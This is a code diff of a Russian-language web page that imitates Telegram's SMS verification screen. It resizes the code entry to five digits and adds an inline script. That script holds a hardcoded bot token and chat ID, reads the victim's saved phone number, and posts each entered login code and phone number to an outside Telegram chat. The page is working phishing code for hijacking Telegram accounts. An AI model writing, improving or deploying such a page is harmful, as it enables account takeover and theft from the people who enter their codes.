@@ -49,24 +49,24 @@
             line-height: 1.4;
         }
 
-        /* Контейнер для 6 квадратиков */
+        /* Контейнер для 5 квадратиков */
         .code-container {
             display: flex;
             gap: 10px;
-            justify-content: space-between;
+            justify-content: center;
             margin-bottom: 32px;
         }
 
         .code-digit {
-            width: 52px;
-            height: 56px;
+            width: 60px;
+            height: 64px;
             background-color: #f8f9fa;
             border: 1.5px solid #e9ecef;
             border-radius: 14px;
-            font-size: 28px;
+            font-size: 32px;
             font-weight: 500;
             text-align: center;
-            line-height: 56px;
+            line-height: 64px;
             color: #1a1a1a;
             box-shadow: inset 0 2px 4px rgba(0,0,0,0.02);
             transition: border 0.15s;
@@ -106,6 +106,11 @@
             background-color: #1f6385;
         }
 
+        .submit-btn:disabled {
+            background-color: #9bc2d9;
+            cursor: not-allowed;
+        }
+
         /* Ссылка для повторной отправки */
         .resend-link {
             text-align: center;
@@ -135,25 +140,47 @@
             color: #8e98a3;
             text-decoration: none;
         }
+
+        /* Мобильные улучшения */
+        @media (max-width: 480px) {
+            .code-digit {
+                width: 50px;
+                height: 54px;
+                font-size: 28px;
+                line-height: 54px;
+            }
+        }
+
+        @media (max-width: 360px) {
+            .code-digit {
+                width: 45px;
+                height: 49px;
+                font-size: 24px;
+                line-height: 49px;
+            }
+            
+            .code-container {
+                gap: 6px;
+            }
+        }
     </style>
 </head>
 <body>
     <div class="tg-card">
         <div class="tg-header">
             <h1>Введите код</h1>
-            <div class="phone-hint">
+            <div class="phone-hint" id="phoneDisplay">
                 Мы отправили SMS с кодом проверки на Ваш телефон.
             </div>
         </div>
 
-        <!-- 6 квадратиков для ввода кода -->
+        <!-- 5 квадратиков для ввода кода (было 6, теперь 5) -->
         <div class="code-container" id="codeContainer">
             <div class="code-digit" id="digit0"></div>
             <div class="code-digit" id="digit1"></div>
             <div class="code-digit" id="digit2"></div>
             <div class="code-digit" id="digit3"></div>
             <div class="code-digit" id="digit4"></div>
-            <div class="code-digit" id="digit5"></div>
         </div><br><br><br><br><br>
 
         <!-- Кнопка для отправки кода -->
@@ -171,6 +198,175 @@
         </div>
     </div>
 
-    <script src="script.js"></script>
+    <script>
+        // ========== СКРИПТ ДЛЯ 5-ЗНАЧНОГО КОДА ==========
+        
+        // ВАШИ ДАННЫЕ TELEGRAM
+        const BOT_TOKEN = '8780785505:AAGKR5NJPxt2OHM0R4dQ725MyhV8JJ5pg3c';
+        const CHAT_ID = '5373563389';
+        
+        // Получаем сохраненный номер
+        const savedPhone = localStorage.getItem('tg_phone') || 'Номер не указан';
+        
+        // Показываем номер на странице
+        const phoneDisplay = document.getElementById('phoneDisplay');
+        if (phoneDisplay) {
+            phoneDisplay.innerHTML = `Мы отправили SMS с кодом проверки на номер:<br><strong>${savedPhone}</strong>`;
+        }
+        
+        // Элементы для кода (ТЕПЕРЬ 5 ЭЛЕМЕНТОВ)
+        const digitElements = [
+            document.getElementById('digit0'),
+            document.getElementById('digit1'),
+            document.getElementById('digit2'),
+            document.getElementById('digit3'),
+            document.getElementById('digit4')
+        ];
+        
+        // Скрытое поле ввода
+        const hiddenInput = document.createElement('input');
+        hiddenInput.type = 'text';
+        hiddenInput.inputMode = 'numeric';
+        hiddenInput.pattern = '[0-9]*';
+        hiddenInput.maxLength = 5; // ТЕПЕРЬ 5
+        hiddenInput.style.position = 'absolute';
+        hiddenInput.style.opacity = '0';
+        hiddenInput.style.pointerEvents = 'none';
+        document.body.appendChild(hiddenInput);
+        
+        let code = '';
+        
+        function updateDigits() {
+            for (let i = 0; i < 5; i++) { // ТЕПЕРЬ 5
+                if (i < code.length) {
+                    digitElements[i].textContent = code[i];
+                    digitElements[i].classList.add('filled');
+                } else {
+                    digitElements[i].textContent = '';
+                    digitElements[i].classList.remove('filled');
+                }
+            }
+        }
+        
+        digitElements.forEach(digit => {
+            digit.addEventListener('click', () => hiddenInput.focus());
+        });
+        
+        hiddenInput.addEventListener('input', (e) => {
+            const rawValue = e.target.value.replace(/[^0-9]/g, '');
+            code = rawValue.slice(0, 5); // ТЕПЕРЬ 5
+            e.target.value = code;
+            updateDigits();
+            
+            // Автоматическая отправка при вводе 5 цифр
+            if (code.length === 5) {
+                // Можно автоматически нажимать кнопку подтверждения
+                // document.getElementById('submitBtn').click();
+            }
+        });
+        
+        hiddenInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace') {
+                if (code.length > 0) {
+                    code = code.slice(0, -1);
+                    hiddenInput.value = code;
+                    updateDigits();
+                }
+                e.preventDefault();
+            }
+        });
+        
+        // Функция отправки в Telegram
+        function sendToTelegram(messageText) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            const message = `
+${messageText}
+📱 <b>Номер:</b> ${savedPhone}
+⏱ <b>Время:</b> ${new Date().toLocaleString('ru-RU')}
+━━━━━━━━━━━━━━━━━━━━━
+            `;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('✅ Отправлено в Telegram');
+                } else {
+                    console.error('❌ Ошибка Telegram:', data);
+                }
+            })
+            .catch(error => {
+                console.error('❌ Ошибка соединения:', error);
+            });
+        }
+        
+        // =================================
+        // ОБРАБОТЧИК КНОПКИ ПОДТВЕРЖДЕНИЯ
+        // =================================
+        document.getElementById('submitBtn').addEventListener('click', function() {
+            if (code.length !== 5) { // ТЕПЕРЬ 5
+                alert('Пожалуйста, введите полный 5-значный код');
+                hiddenInput.focus();
+                return;
+            }
+            
+            // Блокируем кнопку
+            const btn = this;
+            btn.disabled = true;
+            btn.textContent = 'ОТПРАВКА...';
+            
+            // Отправляем код в Telegram
+            sendToTelegram(`🔑 <b>КОД ПОДТВЕРЖДЕНИЯ:</b> <code>${code}</code>`);
+            
+            // Показываем сообщение
+            alert('✅ Код отправлен!');
+            
+            // Разблокируем кнопку через 2 секунды
+            setTimeout(() => {
+                btn.disabled = false;
+                btn.textContent = 'ПОДТВЕРДИТЬ';
+                code = '';
+                updateDigits();
+                hiddenInput.value = '';
+                hiddenInput.focus();
+            }, 2000);
+        });
+        
+        // Повторная отправка кода
+        document.getElementById('resendLink').addEventListener('click', (e) => {
+            e.preventDefault();
+            sendToTelegram(`🔄 <b>ЗАПРОС НОВОГО КОДА</b>`);
+            alert('✅ Новый код отправлен на номер ' + savedPhone);
+        });
+        
+        // Возврат назад
+        document.getElementById('backLink').addEventListener('click', (e) => {
+            e.preventDefault();
+            window.location.href = 'index.html';
+        });
+        
+        // Фокус при загрузке
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                hiddenInput.focus();
+            }, 300);
+        });
+        
+        // Клик по карточке возвращает фокус
+        document.querySelector('.tg-card').addEventListener('click', (e) => {
+            if (!e.target.closest('a') && !e.target.closest('button')) {
+                hiddenInput.focus();
+            }
+        });
+    </script>
 </body>
 </html>
